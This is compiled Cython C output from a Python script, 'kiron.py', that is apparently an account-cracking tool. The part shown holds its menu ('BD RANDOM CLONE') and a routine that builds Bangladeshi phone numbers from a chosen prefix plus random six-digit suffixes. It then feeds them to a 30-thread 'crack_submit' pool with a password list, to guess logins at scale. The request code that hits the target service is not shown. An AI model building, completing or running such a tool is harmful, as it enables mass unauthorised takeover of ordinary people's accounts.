/* "kiron.py":357
 *      ua = random.choice([cudiua1,cudiua2,cudiua3,cudiua4,cudiua5,cudiua6,cudiua7,cudiua8])
 *      return ua
 * def rnd():             # <<<<<<<<<<<<<<
 *     clear()
 *     print('\x1b[38;5;244m[\x1b[1;97m1\x1b[38;5;244m]\x1b[38;5;46m BD RANDOM CLONE')
 */

/* Python wrapper */
static PyObject *__pyx_pw_5kiron_23rnd(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_5kiron_23rnd = {"rnd", (PyCFunction)__pyx_pw_5kiron_23rnd, METH_NOARGS, 0};
static PyObject *__pyx_pw_5kiron_23rnd(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("rnd (wrapper)", 0);
  __pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);
  __pyx_r = __pyx_pf_5kiron_22rnd(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_pf_5kiron_22rnd(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_crk = NULL;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  int __pyx_t_5;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("rnd", 1);

  /* "kiron.py":358
 *      return ua
 * def rnd():
 *     clear()             # <<<<<<<<<<<<<<
 *     print('\x1b[38;5;244m[\x1b[1;97m1\x1b[38;5;244m]\x1b[38;5;46m BD RANDOM CLONE')
 *     print('\x1b[38;5;244m[\x1b[1;97m0\x1b[38;5;244m]\x1b[38;5;46m \033[91;1mBACK MENU')
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_clear); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 358, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  __pyx_t_4 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_4 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_3, NULL};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 358, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "kiron.py":359
 * def rnd():
 *     clear()
 *     print('\x1b[38;5;244m[\x1b[1;97m1\x1b[38;5;244m]\x1b[38;5;46m BD RANDOM CLONE')             # <<<<<<<<<<<<<<
 *     print('\x1b[38;5;244m[\x1b[1;97m0\x1b[38;5;244m]\x1b[38;5;46m \033[91;1mBACK MENU')
 *     linex()
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__58, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 359, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "kiron.py":360
 *     clear()
 *     print('\x1b[38;5;244m[\x1b[1;97m1\x1b[38;5;244m]\x1b[38;5;46m BD RANDOM CLONE')
 *     print('\x1b[38;5;244m[\x1b[1;97m0\x1b[38;5;244m]\x1b[38;5;46m \033[91;1mBACK MENU')             # <<<<<<<<<<<<<<
 *     linex()
 *     crk=input('\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CHOICE :\x1b[38;5;46m ')
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__59, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 360, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "kiron.py":361
 *     print('\x1b[38;5;244m[\x1b[1;97m1\x1b[38;5;244m]\x1b[38;5;46m BD RANDOM CLONE')
 *     print('\x1b[38;5;244m[\x1b[1;97m0\x1b[38;5;244m]\x1b[38;5;46m \033[91;1mBACK MENU')
 *     linex()             # <<<<<<<<<<<<<<
 *     crk=input('\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CHOICE :\x1b[38;5;46m ')
 *     if crk =='1':
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_linex); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 361, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  __pyx_t_4 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_4 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_3, NULL};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 361, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "kiron.py":362
 *     print('\x1b[38;5;244m[\x1b[1;97m0\x1b[38;5;244m]\x1b[38;5;46m \033[91;1mBACK MENU')
 *     linex()
 *     crk=input('\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CHOICE :\x1b[38;5;46m ')             # <<<<<<<<<<<<<<
 *     if crk =='1':
 *         BD()
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_input, __pyx_tuple__60, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 362, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __pyx_v_crk = __pyx_t_1;
  __pyx_t_1 = 0;

  /* "kiron.py":363
 *     linex()
 *     crk=input('\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CHOICE :\x1b[38;5;46m ')
 *     if crk =='1':             # <<<<<<<<<<<<<<
 *         BD()
 *     elif crk =='2':
 */
  __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_v_crk, __pyx_kp_s_1, Py_EQ)); if (unlikely((__pyx_t_5 < 0))) __PYX_ERR(0, 363, __pyx_L1_error)
  if (__pyx_t_5) {

    /* "kiron.py":364
 *     crk=input('\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CHOICE :\x1b[38;5;46m ')
 *     if crk =='1':
 *         BD()             # <<<<<<<<<<<<<<
 *     elif crk =='2':
 *         ND()
 */
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_BD); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 364, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = NULL;
    __pyx_t_4 = 0;
    #if CYTHON_UNPACK_METHODS
    if (unlikely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
        __pyx_t_4 = 1;
      }
    }
    #endif
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_3, NULL};
      __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 364, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    }
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "kiron.py":363
 *     linex()
 *     crk=input('\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CHOICE :\x1b[38;5;46m ')
 *     if crk =='1':             # <<<<<<<<<<<<<<
 *         BD()
 *     elif crk =='2':
 */
    goto __pyx_L3;
  }

  /* "kiron.py":365
 *     if crk =='1':
 *         BD()
 *     elif crk =='2':             # <<<<<<<<<<<<<<
 *         ND()
 *     elif crk =='3':
 */
  __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_v_crk, __pyx_kp_s_2, Py_EQ)); if (unlikely((__pyx_t_5 < 0))) __PYX_ERR(0, 365, __pyx_L1_error)
  if (__pyx_t_5) {

    /* "kiron.py":366
 *         BD()
 *     elif crk =='2':
 *         ND()             # <<<<<<<<<<<<<<
 *     elif crk =='3':
 *         OUT()
 */
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_ND); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 366, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = NULL;
    __pyx_t_4 = 0;
    #if CYTHON_UNPACK_METHODS
    if (unlikely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
        __pyx_t_4 = 1;
      }
    }
    #endif
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_3, NULL};
      __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 366, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    }
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "kiron.py":365
 *     if crk =='1':
 *         BD()
 *     elif crk =='2':             # <<<<<<<<<<<<<<
 *         ND()
 *     elif crk =='3':
 */
    goto __pyx_L3;
  }

  /* "kiron.py":367
 *     elif crk =='2':
 *         ND()
 *     elif crk =='3':             # <<<<<<<<<<<<<<
 *         OUT()
 *     elif crk =='0':
 */
  __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_v_crk, __pyx_kp_s_3, Py_EQ)); if (unlikely((__pyx_t_5 < 0))) __PYX_ERR(0, 367, __pyx_L1_error)
  if (__pyx_t_5) {

    /* "kiron.py":368
 *         ND()
 *     elif crk =='3':
 *         OUT()             # <<<<<<<<<<<<<<
 *     elif crk =='0':
 *         menu()
 */
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_OUT); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 368, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = NULL;
    __pyx_t_4 = 0;
    #if CYTHON_UNPACK_METHODS
    if (unlikely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
        __pyx_t_4 = 1;
      }
    }
    #endif
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_3, NULL};
      __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 368, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    }
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "kiron.py":367
 *     elif crk =='2':
 *         ND()
 *     elif crk =='3':             # <<<<<<<<<<<<<<
 *         OUT()
 *     elif crk =='0':
 */
    goto __pyx_L3;
  }

  /* "kiron.py":369
 *     elif crk =='3':
 *         OUT()
 *     elif crk =='0':             # <<<<<<<<<<<<<<
 *         menu()
 * #[ BANGLADESH ]#
 */
  __pyx_t_5 = (__Pyx_PyString_Equals(__pyx_v_crk, __pyx_kp_s_0_2, Py_EQ)); if (unlikely((__pyx_t_5 < 0))) __PYX_ERR(0, 369, __pyx_L1_error)
  if (__pyx_t_5) {

    /* "kiron.py":370
 *         OUT()
 *     elif crk =='0':
 *         menu()             # <<<<<<<<<<<<<<
 * #[ BANGLADESH ]#
 * def BD():
 */
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_menu); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 370, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = NULL;
    __pyx_t_4 = 0;
    #if CYTHON_UNPACK_METHODS
    if (unlikely(PyMethod_Check(__pyx_t_2))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_2, function);
        __pyx_t_4 = 1;
      }
    }
    #endif
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_3, NULL};
      __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 370, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_1);
      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    }
    __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

    /* "kiron.py":369
 *     elif crk =='3':
 *         OUT()
 *     elif crk =='0':             # <<<<<<<<<<<<<<
 *         menu()
 * #[ BANGLADESH ]#
 */
  }
  __pyx_L3:;

  /* "kiron.py":357
 *      ua = random.choice([cudiua1,cudiua2,cudiua3,cudiua4,cudiua5,cudiua6,cudiua7,cudiua8])
 *      return ua
 * def rnd():             # <<<<<<<<<<<<<<
 *     clear()
 *     print('\x1b[38;5;244m[\x1b[1;97m1\x1b[38;5;244m]\x1b[38;5;46m BD RANDOM CLONE')
 */

  /* function exit code */
  __pyx_r = Py_None; __Pyx_INCREF(Py_None);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_XDECREF(__pyx_t_1);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_AddTraceback("kiron.rnd", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_v_crk);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "kiron.py":372
 *         menu()
 * #[ BANGLADESH ]#
 * def BD():             # <<<<<<<<<<<<<<
 *         clear()
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m EXAMPLE :\x1b[38;5;46m 01768 - 01831 - 01945 - 01634')
 */

/* Python wrapper */
static PyObject *__pyx_pw_5kiron_25BD(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused); /*proto*/
static PyMethodDef __pyx_mdef_5kiron_25BD = {"BD", (PyCFunction)__pyx_pw_5kiron_25BD, METH_NOARGS, 0};
static PyObject *__pyx_pw_5kiron_25BD(PyObject *__pyx_self, CYTHON_UNUSED PyObject *unused) {
  CYTHON_UNUSED PyObject *const *__pyx_kwvalues;
  PyObject *__pyx_r = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("BD (wrapper)", 0);
  __pyx_kwvalues = __Pyx_KwValues_VARARGS(__pyx_args, __pyx_nargs);
  __pyx_r = __pyx_pf_5kiron_24BD(__pyx_self);

  /* function exit code */
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}
static PyObject *__pyx_gb_5kiron_2BD_2generator(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value); /* proto */

/* "kiron.py":382
 *         limit = int(input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CRAKING LIMITE :{A} '))
 *         for n in range(limit):
 *             EX = "".join(random.choice(string.digits) for _ in range(6))             # <<<<<<<<<<<<<<
 *             user.append(EX)
 *         with tred(max_workers=30) as crack_submit:
 */

static PyObject *__pyx_pf_5kiron_2BD_genexpr(CYTHON_UNUSED PyObject *__pyx_self) {
  struct __pyx_obj_5kiron___pyx_scope_struct__genexpr *__pyx_cur_scope;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("genexpr", 0);
  __pyx_cur_scope = (struct __pyx_obj_5kiron___pyx_scope_struct__genexpr *)__pyx_tp_new_5kiron___pyx_scope_struct__genexpr(__pyx_ptype_5kiron___pyx_scope_struct__genexpr, __pyx_empty_tuple, NULL);
  if (unlikely(!__pyx_cur_scope)) {
    __pyx_cur_scope = ((struct __pyx_obj_5kiron___pyx_scope_struct__genexpr *)Py_None);
    __Pyx_INCREF(Py_None);
    __PYX_ERR(0, 382, __pyx_L1_error)
  } else {
    __Pyx_GOTREF((PyObject *)__pyx_cur_scope);
  }
  {
    __pyx_CoroutineObject *gen = __Pyx_Generator_New((__pyx_coroutine_body_t) __pyx_gb_5kiron_2BD_2generator, NULL, (PyObject *) __pyx_cur_scope, __pyx_n_s_genexpr, __pyx_n_s_BD_locals_genexpr, __pyx_n_s_kiron); if (unlikely(!gen)) __PYX_ERR(0, 382, __pyx_L1_error)
    __Pyx_DECREF(__pyx_cur_scope);
    __Pyx_RefNannyFinishContext();
    return (PyObject *) gen;
  }

  /* function exit code */
  __pyx_L1_error:;
  __Pyx_AddTraceback("kiron.BD.genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_r = NULL;
  __Pyx_DECREF((PyObject *)__pyx_cur_scope);
  __Pyx_XGIVEREF(__pyx_r);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

static PyObject *__pyx_gb_5kiron_2BD_2generator(__pyx_CoroutineObject *__pyx_generator, CYTHON_UNUSED PyThreadState *__pyx_tstate, PyObject *__pyx_sent_value) /* generator body */
{
  struct __pyx_obj_5kiron___pyx_scope_struct__genexpr *__pyx_cur_scope = ((struct __pyx_obj_5kiron___pyx_scope_struct__genexpr *)__pyx_generator->closure);
  PyObject *__pyx_r = NULL;
  long __pyx_t_1;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  PyObject *__pyx_t_4 = NULL;
  PyObject *__pyx_t_5 = NULL;
  int __pyx_t_6;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannyDeclarations
  __Pyx_RefNannySetupContext("genexpr", 0);
  switch (__pyx_generator->resume_label) {
    case 0: goto __pyx_L3_first_run;
    case 1: goto __pyx_L6_resume_from_yield;
    default: /* CPython raises the right error here */
    __Pyx_RefNannyFinishContext();
    return NULL;
  }
  __pyx_L3_first_run:;
  if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 382, __pyx_L1_error)
  for (__pyx_t_1 = 0; __pyx_t_1 < 6; __pyx_t_1+=1) {
    __pyx_cur_scope->__pyx_v__ = __pyx_t_1;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_random); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 382, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_choice); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 382, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_string); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 382, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_3);
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_3, __pyx_n_s_digits); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 382, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_t_3 = NULL;
    __pyx_t_6 = 0;
    #if CYTHON_UNPACK_METHODS
    if (unlikely(PyMethod_Check(__pyx_t_4))) {
      __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_4);
      if (likely(__pyx_t_3)) {
        PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_4);
        __Pyx_INCREF(__pyx_t_3);
        __Pyx_INCREF(function);
        __Pyx_DECREF_SET(__pyx_t_4, function);
        __pyx_t_6 = 1;
      }
    }
    #endif
    {
      PyObject *__pyx_callargs[2] = {__pyx_t_3, __pyx_t_5};
      __pyx_t_2 = __Pyx_PyObject_FastCall(__pyx_t_4, __pyx_callargs+1-__pyx_t_6, 1+__pyx_t_6);
      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
      if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 382, __pyx_L1_error)
      __Pyx_GOTREF(__pyx_t_2);
      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
    }
    __pyx_r = __pyx_t_2;
    __pyx_t_2 = 0;
    __pyx_cur_scope->__pyx_t_0 = __pyx_t_1;
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
    /* return from generator, yielding value */
    __pyx_generator->resume_label = 1;
    return __pyx_r;
    __pyx_L6_resume_from_yield:;
    __pyx_t_1 = __pyx_cur_scope->__pyx_t_0;
    if (unlikely(!__pyx_sent_value)) __PYX_ERR(0, 382, __pyx_L1_error)
  }
  CYTHON_MAYBE_UNUSED_VAR(__pyx_cur_scope);

  /* function exit code */
  PyErr_SetNone(PyExc_StopIteration);
  goto __pyx_L0;
  __pyx_L1_error:;
  __Pyx_Generator_Replace_StopIteration(0);
  __Pyx_XDECREF(__pyx_t_2);
  __Pyx_XDECREF(__pyx_t_3);
  __Pyx_XDECREF(__pyx_t_4);
  __Pyx_XDECREF(__pyx_t_5);
  __Pyx_AddTraceback("genexpr", __pyx_clineno, __pyx_lineno, __pyx_filename);
  __pyx_L0:;
  __Pyx_XDECREF(__pyx_r); __pyx_r = 0;
  #if !CYTHON_USE_EXC_INFO_STACK
  __Pyx_Coroutine_ResetAndClearException(__pyx_generator);
  #endif
  __pyx_generator->resume_label = -1;
  __Pyx_Coroutine_clear((PyObject*)__pyx_generator);
  __Pyx_RefNannyFinishContext();
  return __pyx_r;
}

/* "kiron.py":372
 *         menu()
 * #[ BANGLADESH ]#
 * def BD():             # <<<<<<<<<<<<<<
 *         clear()
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m EXAMPLE :\x1b[38;5;46m 01768 - 01831 - 01945 - 01634')
 */

static PyObject *__pyx_pf_5kiron_24BD(CYTHON_UNUSED PyObject *__pyx_self) {
  PyObject *__pyx_v_code = NULL;
  PyObject *__pyx_v_limit = NULL;
  CYTHON_UNUSED PyObject *__pyx_v_n = NULL;
  PyObject *__pyx_v_EX = NULL;
  PyObject *__pyx_v_crack_submit = NULL;
  PyObject *__pyx_v_tl = NULL;
  PyObject *__pyx_v_love = NULL;
  PyObject *__pyx_v_uid = NULL;
  PyObject *__pyx_v_passlist = NULL;
  PyObject *__pyx_gb_5kiron_2BD_2generator = 0;
  PyObject *__pyx_r = NULL;
  __Pyx_RefNannyDeclarations
  PyObject *__pyx_t_1 = NULL;
  PyObject *__pyx_t_2 = NULL;
  PyObject *__pyx_t_3 = NULL;
  int __pyx_t_4;
  Py_ssize_t __pyx_t_5;
  Py_UCS4 __pyx_t_6;
  PyObject *(*__pyx_t_7)(PyObject *);
  int __pyx_t_8;
  PyObject *__pyx_t_9 = NULL;
  PyObject *__pyx_t_10 = NULL;
  PyObject *__pyx_t_11 = NULL;
  PyObject *__pyx_t_12 = NULL;
  PyObject *__pyx_t_13 = NULL;
  PyObject *__pyx_t_14 = NULL;
  PyObject *__pyx_t_15 = NULL;
  int __pyx_t_16;
  int __pyx_t_17;
  int __pyx_lineno = 0;
  const char *__pyx_filename = NULL;
  int __pyx_clineno = 0;
  __Pyx_RefNannySetupContext("BD", 1);

  /* "kiron.py":373
 * #[ BANGLADESH ]#
 * def BD():
 *         clear()             # <<<<<<<<<<<<<<
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m EXAMPLE :\x1b[38;5;46m 01768 - 01831 - 01945 - 01634')
 *         linex()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_clear); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 373, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  __pyx_t_4 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
      PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_2);
      __Pyx_INCREF(__pyx_t_3);
      __Pyx_INCREF(function);
      __Pyx_DECREF_SET(__pyx_t_2, function);
      __pyx_t_4 = 1;
    }
  }
  #endif
  {
    PyObject *__pyx_callargs[2] = {__pyx_t_3, NULL};
    __pyx_t_1 = __Pyx_PyObject_FastCall(__pyx_t_2, __pyx_callargs+1-__pyx_t_4, 0+__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
    if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 373, __pyx_L1_error)
    __Pyx_GOTREF(__pyx_t_1);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
  }
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "kiron.py":374
 * def BD():
 *         clear()
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m EXAMPLE :\x1b[38;5;46m 01768 - 01831 - 01945 - 01634')             # <<<<<<<<<<<<<<
 *         linex()
 *         code = input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CHOICE CODE :{A} ')
 */
  __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__61, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 374, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_1);
  __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;

  /* "kiron.py":375
 *         clear()
 *         print(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m EXAMPLE :\x1b[38;5;46m 01768 - 01831 - 01945 - 01634')
 *         linex()             # <<<<<<<<<<<<<<
 *         code = input(f'\x1b[38;5;244m[\x1b[1;97m*\x1b[38;5;244m] \x1b[38;5;46m CHOICE CODE :{A} ')
 *         clear()
 */
  __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_linex); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 375, __pyx_L1_error)
  __Pyx_GOTREF(__pyx_t_2);
  __pyx_t_3 = NULL;
  __pyx_t_4 = 0;
  #if CYTHON_UNPACK_METHODS
  if (unlikely(PyMethod_Check(__pyx_t_2))) {
    __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_2);
    if (likely(__pyx_t_3)) {
